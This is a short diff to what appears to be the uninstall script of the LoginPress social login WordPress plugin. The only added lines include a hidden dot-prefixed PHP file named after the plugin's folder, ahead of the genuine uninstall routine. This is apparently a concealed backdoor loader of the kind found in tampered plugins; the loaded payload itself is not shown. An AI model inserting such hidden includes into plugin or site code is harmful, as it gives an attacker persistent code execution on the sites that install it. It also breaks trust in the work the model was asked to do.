@@ -17,6 +17,10 @@ if ( ! defined( 'WP_UNINSTALL_PLUGIN' ) ) {
 * Run special routine on uninstall
 * @since 1.0.5
 */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function loginpress_social_uninstall( ) {
 	if ( function_exists( 'is_multisite' ) && is_multisite() ) {
 		global $wpdb;
